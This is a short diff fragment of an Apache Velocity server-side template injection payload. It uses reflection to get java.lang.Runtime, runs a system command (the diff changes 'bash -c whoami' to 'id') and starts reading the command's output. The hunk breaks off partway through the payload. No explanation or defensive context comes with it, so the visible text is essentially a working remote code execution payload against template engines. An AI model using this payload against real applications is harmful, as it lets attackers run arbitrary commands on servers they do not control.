@@ -1,7 +1,7 @@
 #set($engine="")
 #set($run=$engine.getClass().forName("java.lang.Runtime"))
 #set($runtime=$run.getRuntime())
-#set($proc=$runtime.exec("bash -c whoami"))
+#set($proc=$runtime.exec("id"))
 #set($null=$proc.waitFor())
 #set($istr=$proc.getInputStream())
 #set($chr=$engine.getClass().forName("java.lang.Character"))
